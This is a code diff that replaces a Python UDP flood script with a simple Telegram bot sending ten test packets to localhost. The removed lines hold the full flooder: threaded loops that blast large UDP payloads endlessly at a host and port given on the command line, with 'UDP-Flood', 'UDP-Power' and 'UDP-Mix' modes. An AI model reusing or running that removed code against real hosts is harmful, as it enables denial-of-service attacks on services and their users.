@@ -1,40 +1,155 @@
-import sys
+import os
 import socket
-import threading
-#import time as clock
+import time
 
-host = str(sys.argv[1])
-port = int(sys.argv[2])
-#time = int(sys.argv[4])
-method = str(sys.argv[3])
+from telegram import Update
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
 
-loops = 10000
+# =========================
+# CONFIGURATION
+# =========================
 
-def send_packet(amplifier):
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+
+UDP_HOST = "127.0.0.1"
+UDP_PORT = 9999
+
+PACKET_DATA = b"UDP_TEST_PACKET"
+PACKET_COUNT = 10
+
+
+# =========================
+# UDP TEST
+# =========================
+
+def udp_test():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    sent = 0
+
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        s.connect((str(host), int(port)))
-        while True: s.send(b"\x99" * amplifier)
-    except: return s.close()
+        for _ in range(PACKET_COUNT):
+            sock.sendto(PACKET_DATA, (UDP_HOST, UDP_PORT))
+            sent += 1
+            time.sleep(0.05)
 
-#def timer(timeout):
-#    while True:
-#        if clock.time() > timeout: exit()
-#        if clock.time() < timeout: clock.sleep(0.1)
+    finally:
+        sock.close()
 
-def attack_HQ():
-    #timeout = clock.time() + time
-    #timer(timeout)
-    if method == "UDP-Flood":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
-    if method == "UDP-Power":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(750), daemon=True).start()
-    if method == "UDP-Mix":
-        for sequence in range(loops):
-            threading.Thread(target=send_packet(375), daemon=True).start()
-            threading.Thread(target=send_packet(750), daemon=True).start()
+    return sent
 
-attack_HQ()
+
+# =========================
+# TELEGRAM COMMANDS
+# =========================
+
+async def start(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+    await update.message.reply_text(
+        "🤖 Bot is online!\n\n"
+        "/test - Run localhost UDP test\n"
+        "/status - Check bot status"
+    )
+
+
+async def status(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+    await update.message.reply_text(
+        "✅ Bot status: ONLINE\n"
+        "🎯 UDP destination: 127.0.0.1\n"
+        "📦 Test packets: 10"
+    )
+
+
+async def test(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+    await update.message.reply_text(
+        "🧪 Starting localhost UDP test..."
+    )
+
+    sent = udp_test()
+
+    await update.message.reply_text(
+        f"✅ Test completed.\n"
+        f"📦 Packets sent: {sent}\n"
+        f"🎯 Destination: 127.0.0.1:{UDP_PORT}"
+    )
+
+
+# =========================
+# MESSAGE HANDLER
+# =========================
+
+async def message_handler(
+    update: Update,
+    context: ContextTypes.DEFAULT_TYPE
+):
+    text = update.message.text
+
+    await update.message.reply_text(
+        f"You said: {text}"
+    )
+
+
+# =========================
+# MAIN
+# =========================
+
+def main():
+
+    if not BOT_TOKEN:
+        raise RuntimeError(
+            "BOT_TOKEN environment variable is missing."
+        )
+
+    app = (
+        Application
+        .builder()
+        .token(BOT_TOKEN)
+        .build()
+    )
+
+    # Commands
+    app.add_handler(
+        CommandHandler("start", start)
+    )
+
+    app.add_handler(
+        CommandHandler("status", status)
+    )
+
+    app.add_handler(
+        CommandHandler("test", test)
+    )
+
+    # Normal messages
+    app.add_handler(
+        MessageHandler(
+            filters.TEXT & ~filters.COMMAND,
+            message_handler
+        )
+    )
+
+    print("🤖 Telegram bot started")
+
+    app.run_polling()
+
+
+# =========================
+# ENTRY POINT
+# =========================
+
+if __name__ == "__main__":
+    main()
